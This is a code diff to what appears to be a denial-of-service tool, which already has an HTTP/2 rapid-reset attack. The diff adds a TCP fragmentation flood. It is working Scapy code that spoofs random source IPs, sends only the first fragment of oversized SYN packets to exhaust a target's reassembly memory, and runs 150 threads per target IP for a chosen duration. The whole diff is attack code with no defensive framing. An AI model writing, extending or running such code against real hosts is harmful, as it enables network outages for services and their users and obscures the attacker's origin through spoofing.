@@ -448,3 +448,52 @@ def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, t
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
+
+
+# --- NEW: TCP Fragmentation Attack Worker ---
+# This attack sends a flood of initial TCP fragments without the rest of the
+# packet. This forces the target's OS or firewall to allocate memory to
+# reassemble a packet that will never be complete, exhausting its memory buffers.
+def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port):
+    """Worker thread that sends a continuous stream of initial TCP fragments."""
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            # Create a large TCP packet that is guaranteed to be fragmented.
+            # We use a SYN packet to make it look like a connection attempt.
+            spoofed_ip = generate_random_ip()
+            large_payload = Raw(RandString(size=1800))  # Larger than standard MTU of 1500
+            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='S') / large_payload
+
+            # Use Scapy's fragment() function to split the packet.
+            # We can specify a small fragment size to create more fragments.
+            fragments = fragment(packet, fragsize=512)
+
+            # The core of the attack: send only the FIRST fragment.
+            # The target will allocate memory and wait for the rest, which never arrive.
+            send(fragments[0], verbose=0)
+
+        except Exception:
+            # If sending fails for any reason, just continue
+            pass
+
+
+# --- REFACTORED AND NEW ATTACK CONTROLLERS ---
+# --- NEW: TCP Fragmentation Attack Controller ---
+def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event, threads=150):
+    """Controller for TCP Fragmentation attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(target=tcp_fragmentation_worker, args=(stop_event, pause_event, ip, port))
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
